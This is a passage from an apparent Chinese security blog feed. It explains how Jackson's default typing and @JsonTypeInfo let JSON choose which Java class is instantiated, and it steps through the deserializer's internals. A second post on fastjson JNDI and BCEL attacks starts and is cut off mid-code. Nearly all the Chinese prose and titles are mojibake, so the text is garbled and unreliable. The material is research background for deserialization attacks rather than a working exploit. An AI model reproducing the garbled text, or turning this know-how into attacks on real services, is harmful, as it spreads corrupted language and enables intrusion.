class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span>  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">  </span><br><span class="line">getter...setter...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹ä¸¤ç§æ³¨è§£èƒ½è¾¾åˆ°ååºåˆ—åŒ–</p><ul><li>JsonTypeInfo.Id.CLASS</li><li>JsonTypeInfo. Id. MINIMAL_CLASS</li></ul><p>æ¯”å¦‚æ³¨è§£ä¸º<code>@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</code></p><p>åºåˆ—åŒ–å‡ºæ¥çš„jsonå­—ç¬¦å¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–å½“ç„¶ä¹Ÿèƒ½æŒ‰ç…§æŒ‡å®šçš„ç±»è¿›è¡Œååºåˆ—åŒ–</p><p>æ³¨è§£ä¸º<code>@JsonTypeInfo(use = JsonTypeInfo. Id. MINIMAL_CLASS)</code>æ—¶ï¼Œç”¨ @c æ›¿ä»£äº† @classï¼Œå°±æ˜¯ä¸€ä¸ªç®€å•çš„ç¼©çŸ­ï¼Œå’Œ<code>JsonTypeInfo.Id.CLASS</code>ä½œç”¨ç›¸åŒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;age&quot;:6,&quot;name&quot;:&quot;drunkbaby&quot;,&quot;object&quot;:&#123;&quot;@c&quot;:&quot;com.drunkbaby.Hacker&quot;,&quot;skill&quot;:&quot;hiphop&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><h3 id="ååºåˆ—åŒ–æ¡ä»¶"><a href="#ååºåˆ—åŒ–æ¡ä»¶" class="headerlink" title="ååºåˆ—åŒ–æ¡ä»¶"></a>ååºåˆ—åŒ–æ¡ä»¶</h3><p>è¾¾åˆ°ä»¥ä¸‹ä»»æ„ä¸€ä¸ªæ¡ä»¶ï¼Œå¯ä»¥ååºåˆ—åŒ–æŒ‡å®šç±»ï¼š</p><ul><li>å¼€å¯äº†enableDefaultTyping()å››ä¸ªçš„ä»»æ„ä¸€ä¸ªè®¾ç½®ï¼Œä¸è¿‡ä¸åŒè®¾ç½®èƒ½ååºåˆ—åŒ–çš„èŒƒå›´ä¸åŒï¼Œtrickä¹Ÿä¸åŒï¼ˆä¸è¿‡èŒƒå›´æœ€å°çš„JAVA_LANG_OBJECTéƒ½å¤Ÿç”¨ï¼‰</li><li>ä½¿ç”¨äº†@JsonTypeInfoæ³¨è§£å­—æ®µï¼Œæ³¨è§£å€¼ä¸º<code>JsonTypeInfo.Id.CLASS</code>æˆ–è€…<code>JsonTypeInfo. Id. MINIMAL_CLASS</code></li></ul><h3 id="ååºåˆ—åŒ–jsonæ ¼å¼"><a href="#ååºåˆ—åŒ–jsonæ ¼å¼" class="headerlink" title="ååºåˆ—åŒ–jsonæ ¼å¼"></a>ååºåˆ—åŒ–jsonæ ¼å¼</h3><p>å½“ç„¶ï¼Œä½ ä¹Ÿèƒ½è§‚å¯Ÿåˆ°ä¸åŒçš„æŒ‡å®šæ–¹å¼ï¼Œjsonçš„æ ¼å¼ä¸åŒã€‚æ¯”å¦‚enableDefaultTyping()è®¾ç½®ååºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰<code>@</code>ç¬¦å·ï¼Œè€Œæ˜¯ç”¨<code>[]</code>åŒ…è£¹äº†</p><ul><li>enableDefaultTypingå¯¹åº”jsonæ ¼å¼ï¼š</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®JAVA_LANG_OBJECT  </span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;mi1k7ea&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.mi1k7ea.Hacker&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;Jackson&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span> </span><br></pre></td></tr></table></figure><ul><li><code>@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</code></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><code>@JsonTypeInfo(use = JsonTypeInfo. Id. MINIMAL_CLASS)</code></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@c&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–å…¥å£"><a href="#ååºåˆ—åŒ–å…¥å£" class="headerlink" title="ååºåˆ—åŒ–å…¥å£"></a>ååºåˆ—åŒ–å…¥å£</h3><p>ååºåˆ—åŒ–çš„å…¥å£ä¸ºä»¥ä¸‹ä¸¤ä¸ªçš„ä¸€ç§ï¼š</p><ul><li>JsonFactory.createParser</li><li>objectMapper.readValue</li></ul><p>OKï¼Œä¸‹é¢çœ‹çœ‹ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œåˆ°åº•æ€ä¹ˆååºåˆ—åŒ–çš„</p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><h3 id="è°ƒè¯•ä»£ç "><a href="#è°ƒè¯•ä»£ç " class="headerlink" title="è°ƒè¯•ä»£ç "></a>è°ƒè¯•ä»£ç </h3><p>è¿™é‡Œå°±åªè°ƒè¯•å¼€å¯äº†enableDefaultTyping()çš„caseï¼Œæ³¨è§£çš„æ–¹å¼è¿‡ç¨‹ä¹Ÿå·®ä¸å¤š</p><p>Sexæ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Sex</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MySexç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySex</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;</span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MySex</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MySexæ„é€ å‡½æ•°&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.getSex&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.setSex&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Personç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person Constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String param1;</span><br><span class="line">    <span class="keyword">private</span> Sex sex;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getParam1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getParam1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> param1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParam1</span><span class="params">(String param1)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setParam1&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.param1 = param1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Sex <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getSex&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(Sex sex)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setSex&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jacksoncaseä¸»ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jacksoncase</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;param1\&quot;:\&quot;aaa\&quot;,\&quot;sex\&quot;:[\&quot;org.exploit.othercase.jackson.MySex\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011150540636.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011150540636.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æŒ‰ç…§ <code>æ„é€ å‡½æ•°-&gt;setterèµ‹å€¼</code>ï¼Œå¯¹é‡Œé¢çš„å­—æ®µä¹Ÿé‡‡å–è¿™ä¸ªåµŒå¥—çš„æ–¹å¼è¿›è¡Œååºåˆ—åŒ–</p><h3 id="è°ƒç”¨æ„é€ å™¨å’Œsetter"><a href="#è°ƒç”¨æ„é€ å™¨å’Œsetter" class="headerlink" title="è°ƒç”¨æ„é€ å™¨å’Œsetter"></a>è°ƒç”¨æ„é€ å™¨å’Œsetter</h3><p>åœ¨readValueå¤„æ‰“ä¸Šæ–­ç‚¹</p><p>è·Ÿè¿›åˆ°<code>_readMapAndClose</code>ï¼Œä»JsonParserä¸­è¯»å–å¹¶è§£æJSONæ•°æ®ä¸ºæŒ‡å®šçš„valueTypeå¯¹è±¡</p><p>ä¼šèµ°è¿›deser.deserialize</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011154527112.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011154527112.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬è¿™é‡ŒJSONTokenä»¤ç‰Œæ˜¯START_OBJECTï¼Œè¡¨ç¤ºæ˜¯ä¸ªå¯¹è±¡è¿›è¡Œååºåˆ—åŒ–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011154556761.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011154556761.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œå¦‚æœä»¤ç‰Œæ˜¯START_OBJECTï¼Œä¼šèµ°è¿›ifè°ƒç”¨vanillaDeserialize</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011154900652.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011154900652.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>p.nextTokenå°±æ˜¯<code>&#123;</code>ä¸‹ä¸€ä¸ªç¬¦å·ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„â€param1â€ï¼Œå¯¹åº”çš„JsonTokenæ˜¯FIELD_NAME</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011155135088.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011155135088.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>vanillaDeserializeå°±æ˜¯jacksonååºåˆ—åŒ–jsonè‡³å¯¹è±¡çš„ä¸»é€»è¾‘ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011155829805.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011155829805.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>_valueInstantiatoråŒ…å«äº†ä»valueTypeä¸­å–åˆ°çš„æ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011155926684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011155926684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>createUsingDefaultå®Œæˆäº†å®ä¾‹åŒ–Personç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011160138840.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011160138840.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011160150855.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011160150855.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŠŠè¿™ä¸ªå®ä¾‹åŒ–çš„ç©ºçš„beanï¼Œå­˜åˆ°JsonParserä¸­ã€‚</p><p>å¦‚æœJsonParserå½“å‰å¤„äºå­—æ®µåï¼ˆFIELD_NAMEï¼‰çŠ¶æ€ï¼Œåˆ™å¾ªç¯å¤„ç†æ¯ä¸ªå±æ€§</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011160448411.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011160448411.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¤„ç†æ–¹å¼ä¸ºï¼š</p><ul><li>è·å–å½“å‰å±æ€§å</li><li>è·å–ç±»ä¸­å¯¹åº”çš„å­—æ®µä½œä¸ºpropï¼ŒåŒ…å«äº†å¯¹åº”çš„setter</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011161009399.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011161009399.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>propä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨deserializeAndSetè¿›è¡Œè®¾ç½®å­—æ®µ</li></ul><p>è·Ÿè¿›åˆ°deserializeAndSetå†…ï¼Œç»§ç»­è·Ÿåˆ°StringDeserializer.deserialize</p><p>æˆ‘ä»¬è®¾ç½®çš„ç¬¬ä¸€ä¸ªé”®å€¼å¯¹ä¸º<code>&quot;param1&quot;:&quot;aaa&quot;</code>ï¼Œæ‰€ä»¥å­—æ®µå€¼å±äºVALUE_STRINGï¼Œç›´æ¥è¿”å›äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011161301958.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011161301958.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿”å›åç›´æ¥è°ƒç”¨setterèµ‹å€¼äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011161415319.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011161415319.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å†çœ‹ä¸‹å¾ªç¯åˆ°çš„è‡ªå®šä¹‰çš„MySexå¯¹è±¡ï¼Œåœ¨vanillaDeserialize doâ€¦whileçš„ç¬¬äºŒæ¬¡å¾ªç¯ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011161536746.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011161536746.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”±äº<code>_valueTypeDeserializer</code>ä¸ä¸ºç©ºï¼Œï¼ˆåœ¨åˆå§‹åŒ–çš„æ—¶å€™å°±è®¾ä¸ºäº†Arrayå¯¹åº”çš„ååºåˆ—åŒ–å™¨ï¼‰ï¼Œäºæ˜¯è°ƒç”¨æŒ‡å®šååºåˆ—åŒ–å™¨çš„deserializeWithTypeè¿›è¡Œååºåˆ—åŒ–å­—æ®µ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011170025600.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011170025600.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011170008762.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011170008762.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè¿›åˆ°<code>AsArrayTypeDeserializer._deserialize</code>ï¼Œçœ‹åå­—ä¹ŸçŸ¥é“ï¼Œæ•°ç»„çš„ååºåˆ—åŒ–å™¨ï¼Œç»§ç»­è·Ÿè¿›å‘ç°åˆèµ°åˆ°äº†vannillaDeserialize</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011163746878.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241011163746878.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹Ÿå°±æ˜¯ä¸ªåµŒå¥—çš„è§£æ</p><p>ç»§ç»­è·Ÿåˆ°StdValueInstantiator.createFromStringï¼Œå¦‚æœå½“å‰ç±»æœ‰æ„é€ æ–¹æ³•ï¼Œä¼šè¿›å…¥call1()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014111626356.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014111626356.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014111738771.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014111738771.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…³äºjacksonè°ƒç”¨æ— å‚æ„é€ å™¨å’Œæœ‰å‚æ„é€ å™¨çš„é¡ºåºå¦‚ä¸‹ï¼›</p><p><a href="https://blog.csdn.net/jiayoudangdang/article/details/127813330">https://blog.csdn.net/jiayoudangdang/article/details/127813330</a></p><ul><li>æ²¡æœ‰æ— å‚æ„é€ æ—¶ï¼š   <ul><li>å¦‚æœæœ‰å‚æ„é€ çš„å‚æ•°å…¨ï¼Œæˆ–è€…æ›´å¤š(å°±æ˜¯æœ‰ä¸å­˜åœ¨çš„å€¼)ï¼Œè¿™æ ·è¿˜èƒ½æ­£å¸¸è¿è¡Œ</li><li>å¦‚æœå‚æ•°ä¸å…¨åˆ™ç›´æ¥å¼‚å¸¸</li></ul></li><li>æ— å‚æ„é€ å’Œæœ‰å‚æ„é€ æ–¹æ³•éƒ½æœ‰çš„æ—¶å€™å…ˆèµ°æ— å‚æ„é€ ï¼›   <ul><li>æ— å‚æ„é€ éœ€è¦set&#x2F;getæ–¹æ³•æ¥å®Œæˆåºåˆ—åŒ–å’Œååºåˆ—åŒ–</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jackson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson JNDI+ä¸å‡ºç½‘BCEL</title>
      <link href="/2024/10/08/fastjson-lian/"/>
      <url>/2024/10/08/fastjson-lian/</url>
      
        <content type="html"><![CDATA[<p>å›æƒ³fastjsonè·å–setteræ–¹æ³•çš„éƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Method method : methods) &#123; <span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> <span class="number">0</span>, serialzeFeatures = <span class="number">0</span>, parserFeatures = <span class="number">0</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (!methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// TODO &quot;set&quot;çš„åˆ¤æ–­æ”¾åœ¨ JSONField æ³¨è§£åé¢ï¼Œæ„æ€æ˜¯å…è®¸é setter æ–¹æ³•æ ‡è®° JSONField æ³¨è§£ï¼Ÿ</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> methodName.charAt(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    String propertyName;</span><br><span class="line">    <span class="keyword">if</span> (Character.isUpperCase(c3) <span class="comment">//</span></span><br><span class="line">        || c3 &gt; <span class="number">512</span> <span class="comment">// for unicode method name</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">            propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span 